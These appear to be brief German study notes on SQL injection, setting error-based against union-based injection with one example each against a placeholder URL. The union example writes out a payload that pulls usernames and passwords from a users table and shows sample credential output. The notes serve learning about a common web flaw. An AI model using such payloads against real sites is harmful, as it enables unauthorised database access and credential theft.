Zu unterscheiden in "Error Based" oder "Union Based".

# Error-Based
```sql
// Input
www.random.com/app.php?id\=' // Das Hochkomma 
// Output
You have an error in your SQL syntax...
```

# Union-Based
```sql
// Input
www.random.com/app.php?id\=' UNION SELECT username, password FROM users \--
// Output
carlos
asdklsdf
administrator
asjklhnöshf
```
